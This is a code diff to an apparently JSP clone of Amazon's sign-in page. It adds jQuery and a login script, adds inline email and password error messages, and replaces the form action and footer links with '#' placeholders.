@@ -58,12 +58,18 @@
 <head>
     <meta charset="utf-8">
     <title dir="ltr">Amazon Sign IN</title>
+    <link rel="stylesheet" href="../css/bootstrap.min.css">
+
     <!-- <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61gbb09bfIL._RC|11Fd9tJOdtL.css,21ULbzscqzL.css,31Q3id-QR0L.css,31QszevPBSL.css_.css#AUIClients/AmazonUI.min" /> -->
     <link rel="stylesheet" href="../css/amazon1.css"/>
     <link rel="stylesheet" href="../css/amazon2.css"/>
+    <script src="../js/jquery.min.js"></script>
+    <script src="../js/jquery.cookie.js"></script>
+    <script src="../js/login.js"></script>
     <!-- <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-e91ba5c6e67c58c7f9c4c413fa67697feade389e._V2_.css#AUIClients/CVFAssets.secure.min" /> -->
 </head>
 <body>
+<div id="alerts"></div>
 <div id="a-page">
     <div class="a-section a-padding-medium auth-workflow">
         <div class="a-section a-spacing-none auth-navbar">
@@ -92,7 +98,7 @@
 
             <div class="a-section a-spacing-base">
                 <div class="a-section">
-                    <form name="signIn" method="post" novalidate action='login'>
+                    <form name="signIn" id = "signIn" novalidate action='#'>
                         <div class="a-section">
                             <div class="a-box">
                                 <div class="a-box-inner a-padding-extra-large">
@@ -107,6 +113,7 @@
                                         <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1"
                                                class="a-input-text a-span12 auth-autofocus auth-required-field">
                                         <br>
+                                        <span class="error text-danger" id="emailError"></span>
                                         <br>
                                         <%--<div class="form-group">
                                             <strong>Password</strong>
@@ -120,7 +127,7 @@
                                         <input type="password" maxlength="128" id="ap_password" name="psword"
                                                tabindex="1"
                                                class="a-input-text a-span12 auth-autofocus auth-required-field">
-
+                                        <span class="error text-danger" id="passwordError"></span>
                                     </div>
                                     <div class="a-section">
                                     <span id="continue" class="a-button a-button-span12 a-button-primary"><span
@@ -177,16 +184,16 @@
             <div class="a-section a-spacing-small a-text-center a-size-mini">
                 <span class="auth-footer-seperator"></span>
                 <a class="a-link-normal" target="_blank" rel="noopener noreferrer"
-                   href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=200545940">
+                   href="#">
                     Conditions of Use
                 </a>
                 <span class="auth-footer-seperator"></span>
                 <a class="a-link-normal" target="_blank" rel="noopener noreferrer"
-                   href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=200534380">
+                   href="#">
                     Privacy Notice
                 </a>
                 <span class="auth-footer-seperator"></span>
-                <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="/help">
+                <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
                     Help
                 </a>
                 <span class="auth-footer-seperator"></span>
